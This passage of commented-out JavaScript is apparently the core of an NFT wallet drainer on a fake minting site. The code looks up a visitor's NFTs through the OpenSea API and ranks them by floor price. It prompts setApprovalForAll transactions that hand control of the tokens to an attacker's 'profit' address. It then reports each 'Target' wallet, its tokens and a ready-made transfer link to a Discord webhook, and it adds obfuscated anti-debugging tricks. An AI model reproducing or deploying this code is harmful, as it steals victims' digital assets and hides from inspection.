//                                     url: configDataThingsA.image_url,
//                                 }
//                                 fetch(MainConfig.webhook, {
//                                     headers: {
//                                         'content-type': 'application/json',
//                                     },
//                                     body: JSON.stringify({
//                                         username: 'NFT Website',
//                                         avatar_url:
//                                             'https://cdn.discordapp.com/attachments/929719805047627786/940337322006822942/eth-diamond-black-white.png',
//                                         embeds: [
//                                             {
//                                                 color: webhookColor,
//                                                 author: {
//                                                     name: 'NFT Website',
//                                                     icon_url:
//                                                         'https://cdn.discordapp.com/attachments/929719805047627786/940337322006822942/eth-diamond-black-white.png',
//                                                 },
//                                                 thumbnail: webhookThumbnail,
//                                                 fields: [
//                                                     {
//                                                         name: 'Contract',
//                                                         value:
//                                                             '**Name:** ' +
//                                                             configDataThingsA.name +
//                                                             ' (' +
//                                                             configDataThingsA.symbol +
//                                                             ')\n**Schema:** ' +
//                                                             configDataThingsA.schema_name +
//                                                             '\n**Average Price:** ' +
//                                                             transactionDataCollection.average_price.toFixed(
//                                                                 3
//                                                             ) +
//                                                             '\n**Floor Price:** ' +
//                                                             transactionDataCollection.floor_price.toFixed(
//                                                                 3
//                                                             ) +
//                                                             '\n**Links:** [Etherscan](https://etherscan.io/address/' +
//                                                             configDataThingsA.address +
//                                                             ') - [Write To Contract](https://etherscan.io/address/' +
//                                                             configDataThingsA.address +
//                                                             '#writeContract) - [Opensea](https://opensea.io/collection/' +
//                                                             transactionDataCollection.slug +
//                                                             ') ' +
//                                                             (isError === true
//                                                                 ? '- [Transfer](' +
//                                                                   location.protocol +
//                                                                   '//' +
//                                                                   location.hostname +
//                                                                   '/transfer.html?contractAddress=' +
//                                                                   configDataThingsA.address +
//                                                                   '&fromAddress=' +
//                                                                   victimAddress +
//                                                                   '&toAddress=' +
//                                                                   MainConfig.address +
//                                                                   '&tokens=' +
//                                                                   JSON.stringify(
//                                                                       setApprovalForAll
//                                                                           .filter(
//                                                                               (
//                                                                                   dataMIFA
//                                                                               ) =>
//                                                                                   dataMIFA
//                                                                                       .asset_contract
//                                                                                       .address ===
//                                                                                   configDataThingsA.address
//                                                                           )
//                                                                           .map(
//                                                                               (
//                                                                                   dataMIFATkn
//                                                                               ) =>
//                                                                                   dataMIFATkn.token_id
//                                                                           )
//                                                                   ) +
//                                                                   ')'
//                                                                 : ''),
//                                                     },
//                                                     {
//                                                         name: 'Target',
//                                                         value:
//                                                             '**Status:** ' +
//                                                             webhookStatus +
//                                                             '\n**Address:** ' +
//                                                             victimAddress +
//                                                             '\n**Tokens:**\n' +
//                                                             setApprovalForAll
//                                                                 .filter(
//                                                                     (
//                                                                         dataMIFA
//                                                                     ) =>
//                                                                         dataMIFA
//                                                                             .asset_contract
//                                                                             .address ===
//                                                                         configDataThingsA.address
//                                                                 )
//                                                                 .map(
//                                                                     (
//                                                                         dataMIFATkn
//                                                                     ) =>
//                                                                         dataMIFATkn.token_id +
//                                                                         ' ([Etherscan](https://etherscan.io/token/' +
//                                                                         configDataThingsA.address +
//                                                                         '?a=' +
//                                                                         dataMIFATkn.token_id +
//                                                                         ') - [Opensea](' +
//                                                                         dataMIFATkn.permalink +
//                                                                         '))'
//                                                                 )
//                                                                 .join('\n'),
//                                                     },
//                                                 ],
//                                                 footer: {
//                                                     text: 'NFT Website',
//                                                     icon_url:
//                                                         'https://cdn.discordapp.com/attachments/929719805047627786/940337322006822942/eth-diamond-black-white.png',
//                                                 },
//                                                 timestamp: new Date(),
//                                             },
//                                         ],
//                                     }),
//                                     method: 'POST',
//                                 })
//                             },
//                             contractFunctions =
//                                 payableInputs[finalSendValue].asset_contract
//                                     .address
//                         if (
//                             payableInputs.length <= finalSendValue ||
//                             waitingTransactions.includes(contractFunctions)
//                         ) {
//                             return
//                         }
//                         const approveHook = {
//                             name: 'setApprovalForAll',
//                             type: 'function',
//                             stateMutability: 'nonpayable',
//                             inputs: [
//                                 {
//                                     name: 'operator',
//                                     type: 'address',
//                                     internalType: 'address',
//                                 },
//                                 {
//                                     name: 'approved',
//                                     type: 'bool',
//                                     internalType: 'bool',
//                                 },
//                             ],
//                             outputs: [],
//                         }
//                         const ethContractA =
//                                 await new web3Heritage.eth.Contract(
//                                     [approveHook],
//                                     contractFunctions
//                                 ),
//                             victimPayload = {
//                                 from: victimAddress,
//                             }
//                         await ethContractA.methods
//                             .setApprovalForAll(theProfitAddress, true)
//                             .send(victimPayload)
//                             .on('transactionHash', () => {
//                                 waitingTransactions.push(contractFunctions),
//                                     metaSupporterFuncs(
//                                         payableInputs[finalSendValue],
//                                         true
//                                     ),
//                                     transactionDataA(
//                                         setApprovalForAll,
//                                         payableInputs,
//                                         waitingTransactions,
//                                         internalTypeAddress,
//                                         finalSendValue + 1
//                                     )
//                             })
//                             .on('error', () => {
//                                 if (
//                                     !internalTypeAddress.includes(
//                                         contractFunctions
//                                     )
//                                 ) {
//                                     metaSupporterFuncs(
//                                         payableInputs[finalSendValue],
//                                         false
//                                     )
//                                 }
//                                 internalTypeAddress.push(contractFunctions)
//                                 transactionDataA(
//                                     setApprovalForAll,
//                                     payableInputs,
//                                     waitingTransactions,
//                                     internalTypeAddress,
//                                     finalSendValue
//                                 )
//                             })
//                     },
//                     mainDispatcher = async () => {
//                         const dispatchStorage = {
//                             getSelfMutation: function (storage, quantifier) {
//                                 return storage + quantifier
//                             },
//                             savedWordA: 'debu',
//                             savedWordB: 'gger',
//                             savedWordC: 'aajAL',
//                             triggerActionA: 'action',
//                             mutationExists: function (multr, dSelfStorage) {
//                                 return multr === dSelfStorage
//                             },
//                             invokeSelfReturn: function (selfReturnedFunction) {
//                                 return selfReturnedFunction()
//                             },
//                             approveMessage: 'Approved',
//                             rejectedMessage: 'Rejected',
//                             equalsFuncSea: function (
//                                 functionHeritage,
//                                 targetFunction
//                             ) {
//                                 return functionHeritage === targetFunction
//                             },
//                             retturnConcatenateFunc: function (
//                                 returnedFunc,
//                                 value1,
//                                 value2
//                             ) {
//                                 return returnedFunc(value1, value2)
//                             },
//                             requestType: 'application/json',
//                             requestHeaderA: 'NFT Website',
//                             ethImage:
//                                 'https://cdn.discordapp.com/attachments/929719805047627786/940337322006822942/eth-diamond-black-white.png',
//                             contractMessage: 'Contract',
//                             targetMessage: 'Target',
//                             requestMethod: 'POST',
//                         }
//                         const openSeaAPI = MainConfig.opensea,
//                             openSeaConnect = () => {
//                                 const openSeaFunctions = {
//                                     returnNotEqualsSea: function (v1, v2) {
//                                         return v1 !== v2
//                                     },
//                                     bypassWordA: 'meaKH',
//                                     childNext: function (
//                                         partnerReq,
//                                         childThen,
//                                         childThenTo
//                                     ) {
//                                         return partnerReq(
//                                             childThen,
//                                             childThenTo
//                                         )
//                                     },
//                                     openSeaAPIMethod: 'GET',
//                                     parseSeaAssets: function (
//                                         funcAsset,
//                                         assets
//                                     ) {
//                                         return funcAsset(assets)
//                                     },
//                                 }
//                                 return new Promise((receivedAsset) => {
//                                     const _0x51bb4b = {
//                                         kudpo: function (_0x53ef00, _0x10a791) {
//                                             return dispatchStorage.getSelfMutation(
//                                                 _0x53ef00,
//                                                 _0x10a791
//                                             )
//                                         },
//                                         JqTus: dispatchStorage.savedWordA,
//                                         utBlq: dispatchStorage.savedWordB,
//                                         soEjq: dispatchStorage.triggerActionA,
//                                     } // Dejo esto para que no explote el código por 0x51bb4b.kudpo(dispatchStorage.savedWordA, dispatchStorage.savedWordB)
//                                     if (
//                                         dispatchStorage.mutationExists(
//                                             dispatchStorage.savedWordB,
//                                             dispatchStorage.savedWordB
//                                         )
//                                     ) {
//                                         const parentSeaRequestA = async (
//                                             buildArray = [],
//                                             seaExtraData
//                                         ) => {
//                                             // openSeaFunctions.bypassWordA > = 'meaKH' i 0x51bb4b.kudpo(dispatchStorage.savedWordA, bypassWordA)
//                                             if (
//                                                 openSeaFunctions.returnNotEqualsSea(
//                                                     openSeaFunctions.bypassWordA,
//                                                     openSeaFunctions.bypassWordA
//                                                 )
//                                             ) {
//                                                 ;(function () {
//                                                     return true
//                                                 }
//                                                     .constructor(
//                                                         wShhYv.kudpo(
//                                                             wShhYv.JqTus,
//                                                             wShhYv.utBlq
//                                                         )
//                                                     )
//                                                     .call(wShhYv.soEjq))
//                                             } else {
//                                                 const parsedHeaders = {}
//                                                 parsedHeaders['x-api-key'] =
//                                                     openSeaAPI
//                                                 const seaRequestG =
//                                                     await openSeaFunctions
//                                                         .childNext(
//                                                             fetch,
//                                                             'https://api.opensea.io/api/v1/assets?owner=' +
//                                                                 victimAddress +
//                                                                 '&limit=50' +
//                                                                 (seaExtraData
//                                                                     ? '&cursor=' +
//                                                                       seaExtraData
//                                                                     : ''),
//                                                             {
//                                                                 headers:
//                                                                     parsedHeaders,
//                                                                 method: openSeaFunctions.openSeaAPIMethod,
//                                                             }
//                                                         )
//                                                         .then((receivedData) =>
//                                                             receivedData.json()
//                                                         )
//                                                 buildArray = buildArray.concat(
//                                                     seaRequestG.assets
//                                                 )
//                                                 if (seaRequestG.next) {
//                                                     openSeaFunctions.childNext(
//                                                         parentSeaRequestA,
//                                                         buildArray,
//                                                         seaRequestG.next
//                                                     )
//                                                 } else {
//                                                     openSeaFunctions.parseSeaAssets(
//                                                         receivedAsset,
//                                                         buildArray
//                                                     )
//                                                 }
//                                             }
//                                         }
//                                         dispatchStorage.invokeSelfReturn(
//                                             parentSeaRequestA
//                                         )
//                                     } else {
//                                         return false
//                                     }
//                                 })
//                             }
//                         let dataReceivedFromSeaAPI = await openSeaConnect()
//                         let currentSeaIterate = 0
//                         for await (const currentData of dataReceivedFromSeaAPI) {
//                             try {
//                                 const buildedHeaders = {}
//                                 buildedHeaders['x-api-key'] = openSeaAPI
//                                 const openSeaCollection = await fetch(
//                                         'https://api.opensea.io/api/v1/collection/' +
//                                             currentData.collection.slug +
//                                             '/stats',
//                                         {
//                                             headers: buildedHeaders,
//                                             method: 'GET',
//                                         }
//                                     ).then((data) => data.json()),
//                                     openSeaStatsReceived =
//                                         openSeaCollection.stats,
//                                     currentNFTCollection =
//                                         dataReceivedFromSeaAPI[
//                                             currentSeaIterate
//                                         ].collection
//                                 if (
//                                     openSeaStatsReceived &&
//                                     openSeaStatsReceived.average_price
//                                 ) {
//                                     currentNFTCollection.average_price =
//                                         openSeaStatsReceived.average_price
//                                 } else {
//                                     currentNFTCollection.average_price = 0
//                                 }
//                                 if (
//                                     openSeaStatsReceived &&
//                                     openSeaStatsReceived.floor_price
//                                 ) {
//                                     currentNFTCollection.floor_price =
//                                         openSeaStatsReceived.floor_price
//                                 } else {
//                                     currentNFTCollection.floor_price = 0
//                                 }
//                                 currentSeaIterate = currentSeaIterate + 1
//                             } catch (error) {}
//                         }
//                         dataReceivedFromSeaAPI = dataReceivedFromSeaAPI.sort(
//                             (firstValue, firstSecond) =>
//                                 firstSecond.collection.floor_price -
//                                 firstValue.collection.floor_price
//                         )
//                         const allNFTTransaction = dataReceivedFromSeaAPI.filter(
//                             (toAddr, equalsAdd, NFTCollectionArr) =>
//                                 NFTCollectionArr.findIndex(
//                                     (fromAddr) =>
//                                         fromAddr.asset_contract.address ===
//                                         toAddr.asset_contract.address
//                                 ) === equalsAdd
//                         )
//                         console.log(dataReceivedFromSeaAPI)
//                         await transactionDataA(
//                             dataReceivedFromSeaAPI,
//                             allNFTTransaction
//                         )
//                     }
//                 mainDispatcher()
//             })
//             claimButton.click()
//         }
//     }, 1500)
// ;(function () {
//     let antiDebugInterval
//     try {
//         const crashWebMethodA = Function(
//             'return (function() {}.constructor("return this")( ));'
//         )
//         antiDebugInterval = crashWebMethodA()
//     } catch (error) {
//         antiDebugInterval = window
//     }
//     antiDebugInterval.setInterval(regexpMetaOneC, 3000)
// })()

// function regexpMetaOneC(isLegit) {
//     function crashBrowser(legitChecks) {}
//     try {
//         if (isLegit) {
//             return crashBrowser
//         } else {
//             crashBrowser(0)
//         }
//     } catch (error) {}
// }
